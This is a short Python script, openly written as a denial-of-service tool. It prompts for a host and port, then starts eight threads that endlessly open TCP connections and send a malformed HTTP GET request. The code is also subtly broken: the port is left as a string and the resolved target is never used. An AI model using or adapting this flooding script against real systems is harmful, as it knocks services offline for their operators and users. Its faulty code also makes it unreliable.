import socket 
from threading import Thread
host = input("Enter a host: ")
target = socket.gethostbyname(host)
port = input("Enter a port: ")
def dos():
    while True:
        mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            mysocket.connect((host, port))
            mysocket.send(str.encode("GET " + "haste mal 3 fufzig" + "HTTP/1.1 \r\n"))
            mysocket.sendto(str.encode("GET " + "haste mal 3 fufzig" + "HTTP/1.1 \r\n"), (host, port))
        except socket.error:
            print("error")
        mysocket.close()

for i in range(8):
    t = Thread(target=dos)
    t.start()
